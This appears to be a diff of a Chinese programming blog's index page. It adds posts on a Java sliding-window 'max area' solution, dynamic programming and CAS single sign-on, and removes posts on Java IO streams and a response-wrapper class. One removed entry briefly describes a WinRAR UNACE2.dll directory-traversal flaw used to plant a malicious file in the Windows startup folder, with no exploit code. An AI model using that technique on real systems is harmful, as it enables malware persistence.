+<p>alter table rep_source_data_industry_region change district district text character set utf8 COLLATE utf8_general_ci NULL;</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">spring</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/10/java/spring事务/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-algorithm/sildewindow/最大面积" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/06/algorithm/sildewindow/最大面积/">求最大面积</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/06/algorithm/sildewindow/最大面积/" class="archive-article-date">
+  	<time datetime="2019-06-06T07:55:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h3><p><img src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg" alt="contains"></p>
+<p>假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br></p>
+<h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h3><p>利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br></p>
+<p>因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br></p>
+<ul>
+<li>若left 高于 right, 则右边界收缩</li>
+<li>若left 低于 right, 则左边界收缩</li>
+<li>记录过程中的 Max(area)</li>
+</ul>
+<h3 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxArea(int[] height) &#123;</span><br><span class="line">        int right = height.length - 1;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int max = 0;</span><br><span class="line">        while(left &lt; right)&#123;</span><br><span class="line">            int s = Math.min(height[left], height[right]) * (right-left);</span><br><span class="line">            max = Math.max(max,s);</span><br><span class="line">            if(height[left] &gt; height[right])&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -206,7 +1008,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/05/27/algorithm/manacher/manacher/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/06/06/algorithm/sildewindow/最大面积/">展开全文 >></a>
         </p>
       
 
@@ -236,65 +1038,27 @@
 
 
   
-    <article id="post-java/io/输入输出流" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-algorithm/动态规划/dynamic-programing" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/26/java/io/输入输出流/">输入输出流</a>
+      <a class="article-title" href="/2019/06/05/algorithm/动态规划/dynamic-programing/">动态规划算法</a>
     </h1>
   
 
         
-        <a href="/2019/04/26/java/io/输入输出流/" class="archive-article-date">
-  	<time datetime="2019-04-26T05:22:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-26</time>
+        <a href="/2019/06/05/algorithm/动态规划/dynamic-programing/" class="archive-article-date">
+  	<time datetime="2019-06-05T07:03:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="一-整体概念"><a href="#一-整体概念" class="headerlink" title="一.整体概念"></a>一.整体概念</h3><p>Java.io 包含几乎所有的java的输入输出类</p>
-<p>先来一张 <a href="http://www.runoob.com/java/java-files-io.html" target="_blank" rel="noopener">菜鸟教程</a> 的图片<br><br><img src="http://67.216.218.49:8000/file/blogs/java/io/iostream.png" alt="io"></p>
-<p>再来一张 <a href="http://www.runoob.com/java/java-files-io.html" target="_blank" rel="noopener">csdn</a> (推荐，写得很好)简化的图片<br><br><img src="http://67.216.218.49:8000/file/blogs/java/io/iostream2.png" alt="io2"></p>
-<p>java中io流分字节流与字符流两种。</p>
-<p>字符流:</p>
-<p>Reader 和 Writer 为字符流抽象基类，提供基本抽象方法。<br><br>InputStreamReader 和 OutputStreamWriter 为字符转换流，目的是将字节流转化为字符流。<br><br>BufferdReader 和 BufferdWriter 字符缓冲流，高效的从字符流中读取文不。<br><br>FileReader 和 FileWriter 为 InputStreamReader 和 OutputStreamWriter 的子类，特意用来读写文件。<br></p>
-<p>字节流:</p>
-<p>InputStream 和 OutputStream 为字节流抽象基类，抽象基本方法。<br><br>FileInputStream 和 FileOutputStream 为文件字节流，读写文件原始字节。<br><br>BufferdInputStream 和 BufferdOutputStream 为字节缓冲流，利用缓冲区，提高读写效率。<br></p>
-<h3 id="二-具体方法"><a href="#二-具体方法" class="headerlink" title="二.具体方法"></a>二.具体方法</h3><h4 id="1-字符流"><a href="#1-字符流" class="headerlink" title="1.字符流"></a>1.字符流</h4><p>Reader:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public abstract class Reader implements Readable, Closeable &#123;</span><br><span class="line">    //将字符读入缓冲区</span><br><span class="line">    public int read(java.nio.CharBuffer target)</span><br><span class="line">    //读取字符(单个)</span><br><span class="line">    public int read()</span><br><span class="line">    //将字符读入数组</span><br><span class="line">    public int read(char cbuf[])</span><br><span class="line">    //将字符读入数组某个部分</span><br><span class="line">    abstract public int read(char cbuf[], int off, int len)</span><br><span class="line">    //跳过某些字符</span><br><span class="line">    public long skip(long n)</span><br><span class="line">    //是否准备好读取</span><br><span class="line">    public boolean ready()</span><br><span class="line">    //是否支持mark操作</span><br><span class="line">    public boolean markSupported() &#123;...&#125;</span><br><span class="line">    //mark</span><br><span class="line">    public void mark(int readAheadLimit)</span><br><span class="line">    //重置流</span><br><span class="line">    public void reset()</span><br><span class="line">    //关闭</span><br><span class="line">    abstract public void close() throws IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>InputStreamReader:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class InputStreamReader extends Reader &#123;</span><br><span class="line">    //构造方法,默认/字符集名称/字符集/字符集解码器</span><br><span class="line">    public InputStreamReader(InputStream in)</span><br><span class="line">    public InputStreamReader(InputStream in, String charsetName)</span><br><span class="line">    public InputStreamReader(InputStream in, Charset cs)</span><br><span class="line">    public InputStreamReader(InputStream in, CharsetDecoder dec)</span><br><span class="line">    //扩展方法</span><br><span class="line">    public String getEncoding()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>BufferdReader:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class BufferedReader extends Reader &#123;</span><br><span class="line">    //构造器，默认/自定义buffer大小</span><br><span class="line">    public BufferedReader(Reader in)</span><br><span class="line">    public BufferedReader(Reader in, int sz)</span><br><span class="line">    //特有方法</span><br><span class="line">    //确保流未被关闭</span><br><span class="line">    private void ensureOpen()</span><br><span class="line">    //读取一行</span><br><span class="line">    public String readLine()</span><br><span class="line">    //以流的形式返回一行</span><br><span class="line">    public Stream&lt;String&gt; lines()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>FileReader:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class FileReader extends InputStreamReader &#123;</span><br><span class="line">    //构造方法</span><br><span class="line">    public FileReader(String fileName)</span><br><span class="line">    public FileReader(File file)</span><br><span class="line">    public FileReader(FileDescriptor fd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Writer:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public abstract class Writer implements Appendable, Closeable, Flushable &#123;</span><br><span class="line">    //写入单个字符</span><br><span class="line">    public void write(int c)</span><br><span class="line">    //写入数组内所有字符</span><br><span class="line">    public void write(char cbuf[])</span><br><span class="line">    //写入一部分</span><br><span class="line">    abstract public void write(char cbuf[], int off, int len)</span><br><span class="line">    //写字符串</span><br><span class="line">    public void write(String str)</span><br><span class="line">    public void write(String str, int off, int len)</span><br><span class="line">    //追加字符序列</span><br><span class="line">    public Writer append(CharSequence csq)</span><br><span class="line">    public Writer append(CharSequence csq, int start, int end)</span><br><span class="line">    //追究字符</span><br><span class="line">    public Writer append(char c)</span><br><span class="line">    //刷新整个流</span><br><span class="line">    abstract public void flush()</span><br><span class="line">    //关闭</span><br><span class="line">    abstract public void close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>OutputStreamWriter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class OutputStreamWriter extends Writer &#123;</span><br><span class="line">    //构造方法，默认/字符集名/字符集/字符集编码器</span><br><span class="line">    public OutputStreamWriter(OutputStream out)</span><br><span class="line">    public OutputStreamWriter(OutputStream out, String charsetName)</span><br><span class="line">    public OutputStreamWriter(OutputStream out, Charset cs)</span><br><span class="line">    public OutputStreamWriter(OutputStream out, CharsetEncoder enc)</span><br><span class="line">    //特有方法</span><br><span class="line">    public String getEncoding()</span><br><span class="line">    //刷新buffer</span><br><span class="line">    void flushBuffer()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>BufferdWriter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class BufferedWriter extends Writer &#123;</span><br><span class="line">    //构造器，默认大小/缓冲区大小</span><br><span class="line">    public BufferedWriter(Writer out)</span><br><span class="line">    public BufferedWriter(Writer out, int sz)</span><br><span class="line">    //特有</span><br><span class="line">    //换行</span><br><span class="line">    public void newLine()</span><br><span class="line">    //刷新缓冲区  </span><br><span class="line">    void flushBuffer()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>FileWriter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class FileWriter extends OutputStreamWriter&#123;</span><br><span class="line">    //构造器</span><br><span class="line">    public FileWriter(String fileName)</span><br><span class="line">    //是否追加的方式写入文件</span><br><span class="line">    public FileWriter(String fileName, boolean append)</span><br><span class="line">    public FileWriter(File file)</span><br><span class="line">    public FileWriter(FileDescriptor fd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="2-字节流"><a href="#2-字节流" class="headerlink" title="2.字节流"></a>2.字节流</h4><p>InputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public abstract class InputStream implements Closeable &#123;</span><br><span class="line">    //从输入流中读取下一个字节byte</span><br><span class="line">    public abstract int read()</span><br><span class="line">    //从输入流中读取一定数量字节到数组中</span><br><span class="line">    public int read(byte b[])</span><br><span class="line">    //读取输入流中len个字节</span><br><span class="line">    public int read(byte b[], int off, int len)</span><br><span class="line">    //跳过</span><br><span class="line">    public long skip(long n)</span><br><span class="line">    //输入流是否可读取</span><br><span class="line">    public int available()</span><br><span class="line">    //关闭</span><br><span class="line">    public void close()</span><br><span class="line">    //是否支持reset方法</span><br><span class="line">    public boolean markSupported()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>FileInputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class FileInputStream extends InputStream&#123;</span><br><span class="line">    //构造器</span><br><span class="line">    public FileInputStream(String name)</span><br><span class="line">    public FileInputStream(File file)</span><br><span class="line">    public FileInputStream(FileDescriptor fdObj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>BufferdInputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class BufferedInputStream extends FilterInputStream &#123;</span><br><span class="line">    //构造器</span><br><span class="line">    public BufferedInputStream(InputStream in)</span><br><span class="line">    public BufferedInputStream(InputStream in, int size)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>OutputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public abstract class OutputStream implements Closeable, Flushable&#123;</span><br><span class="line">    //写入</span><br><span class="line">    public abstract void write(int b)</span><br><span class="line">    //将数组内的字符写入</span><br><span class="line">    public void write(byte b[])</span><br><span class="line">    //将数组内特定部分字符写入</span><br><span class="line">    public void write(byte b[], int off, int len)</span><br><span class="line">    //刷新</span><br><span class="line">    public void flush()</span><br><span class="line">    //关闭</span><br><span class="line">    public void close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>FileOutputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class FileOutputStream extends OutputStream&#123;</span><br><span class="line">    //构造器</span><br><span class="line">    public FileOutputStream(String name)</span><br><span class="line">    public FileOutputStream(String name, boolean append)</span><br><span class="line">    public FileOutputStream(File file)</span><br><span class="line">    public FileOutputStream(File file, boolean append)</span><br><span class="line">    public FileOutputStream(FileDescriptor fdObj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>BufferdOutputStream:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class BufferedOutputStream extends FilterOutputStream &#123;</span><br><span class="line">    //构造器</span><br><span class="line">    public BufferedOutputStream(OutputStream out)</span><br><span class="line">    public BufferedOutputStream(OutputStream out, int size)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="三-实际例子"><a href="#三-实际例子" class="headerlink" title="三.实际例子"></a>三.实际例子</h3><p>读取socket发送过来的字节流</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//1.客户端发过来的字节流 socket.getInputStream()</span><br><span class="line">//2.字节流转为字符流 InputStreamReader()</span><br><span class="line">//3.高效读写 BufferedReader()</span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class="line">socket.getInputStream()));</span><br><span class="line">System.out.println(in.readLine());  // 打印</span><br></pre></td></tr></table></figure>
-<h3 id="四-区别"><a href="#四-区别" class="headerlink" title="四.区别"></a>四.区别</h3><p><a href="https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter" target="_blank" rel="noopener">https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter</a></p>
+        <h3 id="动态规划原理"><a href="#动态规划原理" class="headerlink" title="动态规划原理"></a>动态规划原理</h3><p>将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。</p>
 
       
 
@@ -308,7 +1072,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">algorithm</a>
         		</li>
       		
 		</ul>
@@ -318,7 +1082,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/26/java/io/输入输出流/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/06/05/algorithm/动态规划/dynamic-programing/">展开全文 >></a>
         </p>
       
 
@@ -348,78 +1112,60 @@
 
 
   
-    <article id="post-security/vulnerability/winrar目录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>winrar目录穿越</p>
-<p>winrar下载<br>官网最新版本：5.71 beta 1<br><a href="https://www.rarlab.com/rar/winrar-x64-571b1.exe" target="_blank" rel="noopener">https://www.rarlab.com/rar/winrar-x64-571b1.exe</a><br>根据此规则,下载以前版本:5.50<br><a href="https://www.rarlab.com/rar/winrar-x64-550.exe" target="_blank" rel="noopener">https://www.rarlab.com/rar/winrar-x64-550.exe</a></p>
-<p>漏洞原理<br><a href="https://paper.tuisec.win/detail/896098d4d19debb" target="_blank" rel="noopener">https://paper.tuisec.win/detail/896098d4d19debb</a><br>winrar中的UNACE2.dll动态链接库处理文件路径时，通过特殊构造的路径，可以触发目录穿越漏洞。<br>利用此漏洞将恶意文件放到windows启动目录下，实现开机自启。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/09/security/vulnerability/winrar目录/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-wheels/java/ResultMessage封装" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-base/cas-sso/cas" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/12/wheels/java/ResultMessage封装/">返回消息</a>
+      <a class="article-title" href="/2019/05/30/base/cas-sso/cas/">Cas 单点登录原理</a>
     </h1>
   
 
         
-        <a href="/2019/03/12/wheels/java/ResultMessage封装/" class="archive-article-date">
-  	<time datetime="2019-03-12T08:40:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-12</time>
+        <a href="/2019/05/30/base/cas-sso/cas/" class="archive-article-date">
+  	<time datetime="2019-05-30T08:30:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="1-状态"><a href="#1-状态" class="headerlink" title="1.状态"></a>1.状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class StatusCode &#123;</span><br><span class="line">    private int status;</span><br><span class="line">    private String message;</span><br><span class="line"></span><br><span class="line">    public static StatusCode SUCCESS = new StatusCode(200,&quot;SUCCESS&quot;);</span><br><span class="line"></span><br><span class="line">    public static StatusCode INVALID_REQUEST = new StatusCode(400,&quot;请求有误&quot;);</span><br><span class="line">    public static StatusCode UNAUTHORIZED_ERROR = new StatusCode(401,&quot;权限错误&quot;);</span><br><span class="line">    public static StatusCode FORBIDDEN  = new StatusCode(403,&quot;禁止访问&quot;);</span><br><span class="line">    public static StatusCode NOT_FOUND  = new StatusCode(404,&quot;找不到对应地址&quot;);</span><br><span class="line">    public static StatusCode NOT_ACCEPTABLE = new StatusCode(406,&quot;请求参数格式不对,json/xml?&quot;);</span><br><span class="line">    public static StatusCode PARAMS_VALID_EXCEPTION = new StatusCode(422,&quot;参数校验异常，未通过&quot;);</span><br><span class="line">    public static StatusCode ALEADY_EXIST= new StatusCode(423,&quot;该条数据已存在&quot;);</span><br><span class="line">    public static StatusCode USER_INFO_ERROR= new StatusCode(424,&quot;用户信息不匹配&quot;);</span><br><span class="line">    public static StatusCode SERVER_EXCEPTION = new StatusCode(500,&quot;服务端处理发生错误&quot;);</span><br><span class="line">    public static StatusCode UNEXPECTED_FINISHED = new StatusCode(511,&quot;操作未正常完成&quot;);</span><br><span class="line">    public static StatusCode AUTHENTICATION_EXCEPTION = new StatusCode(512,&quot;认证错误&quot;);</span><br><span class="line">    public static StatusCode EXPIRED_EXCEPTION = new StatusCode(513,&quot;过期&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //其它问题 待定</span><br><span class="line">    public static StatusCode EXCEPTION_DATABASE = new StatusCode(&quot;数据库操作发生异常&quot;);</span><br><span class="line">    public static StatusCode EXCEPTION_DEAL = new StatusCode(&quot;处理流程中发生异常&quot;);</span><br><span class="line">    public static StatusCode EXCEPTION_HTTP= new StatusCode(&quot;HTTP调用异常&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static StatusCode FILETYPE_ERROR = new StatusCode(2212, &quot;文件类型错误&quot;);</span><br><span class="line">    public static StatusCode FILESIZE_EXCESSIVE = new StatusCode(2213, &quot;文件过大&quot;);</span><br><span class="line">    public static StatusCode UPLOAD_FAILED = new StatusCode(2214, &quot;文件上传失败&quot;);</span><br><span class="line"></span><br><span class="line">    public static StatusCode SAVE_ERROR=new StatusCode(2215,&quot;保存错误&quot;);</span><br><span class="line">    public static StatusCode LOGIN_FAILED=new StatusCode(2216,&quot;登录失败&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private StatusCode(String message)&#123;</span><br><span class="line">        this.message = message;</span><br><span class="line">    &#125;</span><br><span class="line">    private StatusCode(int status, String message) &#123;</span><br><span class="line">        this.status = status;</span><br><span class="line">        this.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getStatus() &#123;</span><br><span class="line">        return this.status;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getMessage() &#123;</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line">    //用于提示消息拓展</span><br><span class="line">    public void setMessage(String message) &#123;</span><br><span class="line">        this.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="2-返回"><a href="#2-返回" class="headerlink" title="2.返回"></a>2.返回</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">public class ResultMessage&lt;T&gt;&#123;</span><br><span class="line">    //提示信息</span><br><span class="line">    private String message;</span><br><span class="line">    //状态</span><br><span class="line">    private int status;</span><br><span class="line">    //返回消息内容</span><br><span class="line">    private T data;</span><br><span class="line"></span><br><span class="line">    private ResultMessage(T data) &#123;</span><br><span class="line">        